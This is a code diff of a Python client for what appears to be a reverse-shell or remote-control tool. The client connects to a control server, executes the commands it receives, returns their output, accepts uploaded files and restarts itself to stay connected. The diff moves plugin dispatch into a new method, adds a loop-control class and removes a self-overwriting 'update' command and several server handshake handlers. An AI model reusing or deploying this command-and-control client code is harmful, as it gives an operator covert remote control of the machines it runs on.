@@ -8,6 +8,11 @@ from base64 import b64decode
 from time import sleep
 
 
+class LoopController(object):
+    def __init__(self):
+        self.should_break = False
+
+
 class Client(object):
     def __init__(self, host='', port=6667, recv_size=1024, server_shutdown=False, session_id='', shutdown_kill=False):
         self.host = host
@@ -44,18 +49,6 @@ class Client(object):
 
         return self.sock
 
-    def _send_output_with_cwd(self, some_data):
-        """
-        Send something back to the control server with the current
-        working directory appended to the end of it.
-
-        :param some_data:
-        :return:
-        """
-
-        self.sock.send(str.encode(some_data + str(os.getcwd()) + '> ' + '~!_TERM_$~'))
-        return self
-
     def get_client_plugins(self):
         """
         Dynamically import any client_plugins in the `client_plugins` package.
@@ -84,6 +77,19 @@ class Client(object):
         """
 
         self.send_data('~!_TERM_$~', terminate=False)
+
+    def server_print(self, some_data):
+        """
+        A shortcut method to facilitate sending data to the server without worrying about
+        whether or not there is a newline character at the end.
+
+        :param some_data:
+        :return:
+        """
+
+        some_data = some_data + '\n' if some_data[-1] != '\n' else some_data
+        self.send_data(some_data)
+        return
 
     def send_data(self, some_data, echo=True, encode=True, terminate=True):
         """
@@ -192,26 +198,19 @@ class Client(object):
         ]
         # execv(sys.executable, rc)
 
-        p = subprocess.Popen(restart_command)
-        p.communicate()
+        try:
+            popen_rc = [sys.executable] + list(sys.argv)
+            p = subprocess.Popen(popen_rc)
+            p.communicate()
+        except PermissionError:
+            from os import execv
+            print('Using execv...')
+            rc.pop(0)
+            rc.insert(0, realpath(__file__))
+            rc.insert(0, '')
+            execv(sys.executable, rc)
+
         sys.exit()
-
-    def negotiate_server_shutdown(self):
-        """
-        Negotiate a server shutdown.
-
-        :return:
-        """
-
-        if self.server_shutdown:
-            self.send_data('Y')
-            self.sock.close()
-            if self.shutdown_kill:
-                sys.exit()
-            self.reboot_self()
-        else:
-            self.send_data('N')
-        return self
 
     def handle_disconnect(self):
         """
@@ -282,11 +281,6 @@ class Client(object):
                         self.set_session_id(data.split(' ')[1])
                         continue
 
-                    # Send the current working directory back.
-                    if data == 'oyster getcwd':
-                        self._send_output_with_cwd('')
-                        continue
-
                     # Set the client ip so it's aware
                     if data[:7] == 'set ip ':
                         self.send_data('IP set.')
@@ -302,12 +296,6 @@ class Client(object):
                     if data[:9] == 'set port ':
                         self.send_data('Port set.')
                         self.connected_port = data[9:]
-                        continue
-
-                    # Check to see if the client should send the
-                    # server shutdown confirmation.
-                    if data == 'server_shutdown?':
-                        self.negotiate_server_shutdown()
                         continue
 
                     # Handle a connect event.
@@ -333,11 +321,6 @@ class Client(object):
                             self.session_id = uuid
                         continue
 
-                    # Send a pong back.
-                    if data == 'oyster ping':
-                        self.send_data('pong')
-                        continue
-
                     # Disconnect from the server.
                     if data == 'disconnect':
                         self.handle_disconnect()
@@ -354,38 +337,27 @@ class Client(object):
                         self.sock.close()
                         break
 
-                    # Handle quit events sent from the server.
-                    if data == 'quit':
-                        self.send_data('confirmed')
-                        sleep(1)
-                        continue
-
                     # # # # # # # PROCESS PLUGINS # # # # # # #
-                    if plugin_list:
-                        plugin_ran = False
-                        for module in plugin_list:
-                            invocation_length = len(module.Plugin.invocation)
-
-                            # Check the data for the client plugin command invocation
-                            # and check to see if the plugin is enabled
-                            if data[:invocation_length] == module.Plugin.invocation and module.Plugin.enabled:
-                                try:
-                                    plugin = module.Plugin()
-                                except AttributeError:
-                                    continue
-                                print('Running Plugin...')
-                                plugin.run(self, data[invocation_length:])
-                                plugin_ran = True
+                    plugin_ran, loop_controller = self.process_plugins(plugin_list, data)
+                    if plugin_ran:
+                        if isinstance(loop_controller, LoopController):
+                            if loop_controller.should_break:
                                 break
-
-                        if plugin_ran:
-                            continue
+                        continue
 
                     # Handle setting the file upload name.
                     if data[:16] == 'upload_filepath ':
                         upload_filepath = data[16:]
                         self.send_data('Got filepath.')
                         continue
+
+                # # # # # # # PROCESS PLUGINS # # # # # # #
+                plugin_ran, loop_controller = self.process_plugins(plugin_list, data)
+                if plugin_ran:
+                    if isinstance(loop_controller, LoopController):
+                        if loop_controller.should_break:
+                            break
+                    continue
 
                 if data[:11] == 'upload_data':
                     if not upload_filepath:
@@ -394,19 +366,6 @@ class Client(object):
                     self.send_data('Send Data')
                     upload_data = self.receive_data()
                     self.handle_file_upload(upload_data, upload_filepath)
-                    continue
-
-                # Update the client.py file(this file here).
-                if data[:7] == 'update ':
-                    print('Overwriting self...')
-                    with open('client.py', 'w') as f:
-                        f.write(data[7:])
-                        f.close()
-                    self.send_data('Client updated...\n')
-                    print('Rebooting in 2 seconds...')
-                    sleep(2)
-                    print('###################### REBOOTING ######################')
-                    self.reboot_self()
                     continue
 
                 # Process the command.
@@ -439,6 +398,58 @@ class Client(object):
                 # Send the output back to control server.
                 self.send_data(output_str)
 
+    def process_plugins(self, plugin_list, data):
+        """
+        Process plugins to see if the data should be intercepted.
+
+        :param plugin_list:
+        :param data:
+        :return:
+        """
+
+        def run_plugin(_module, _data):
+            """
+            Run the plugin in the given module.
+
+            :param _module:
+            :param _data:
+            :return:
+            """
+
+            print('\n< {} >\n'.format(_module.__name__))
+            try:
+                plugin = _module.Plugin()
+            except AttributeError:
+                return False
+
+            # Remove the invocation command from the rest of the data.
+            command = _data[invocation_length:]
+            _result = plugin.run(self, command)
+            _plugin_ran = True
+            print('\n< /{} >'.format(_module.__name__))
+            return _plugin_ran, _result
+
+        if plugin_list:
+            plugin_ran = False
+            result = False
+            for module in plugin_list:
+                results = False
+
+                invocation_length = len(module.Plugin.invocation)
+                invocation_type = type(module.Plugin.invocation)
+
+                if invocation_type == list or invocation_type == tuple:
+                    if data[:invocation_length] in module.Plugin.invocation:
+                        results = run_plugin(module, data)
+                elif data[:invocation_length] == module.Plugin.invocation:
+                    if module.Plugin.enabled or (hasattr(module.Plugin, 'required') and module.Plugin.required):
+                        results = run_plugin(module, data)
+
+                if not results:
+                    continue
+                plugin_ran, result = results
+
+            return plugin_ran, result
 
 if __name__ == '__main__':
     the_host = ''
@@ -465,8 +476,6 @@ if __name__ == '__main__':
         elif 'session_id=' in arg:
             the_session_id = arg.split('=')[1].strip()
 
-    restart_command = list(sys.argv)
-
     for argument in sys.argv[1:]:
         check_cli_arg(argument)
 
@@ -478,12 +487,8 @@ if __name__ == '__main__':
         server_shutdown=the_server_shutdown,
         session_id=the_session_id
     )
+
     client.main()
-
-    restart_command.insert(0, sys.executable)
-
-    print('Restart Command: {}'.format(restart_command))
-    p = subprocess.Popen(restart_command)
-    p.communicate()
+    client.reboot_self()
     sys.exit()
-pass
+
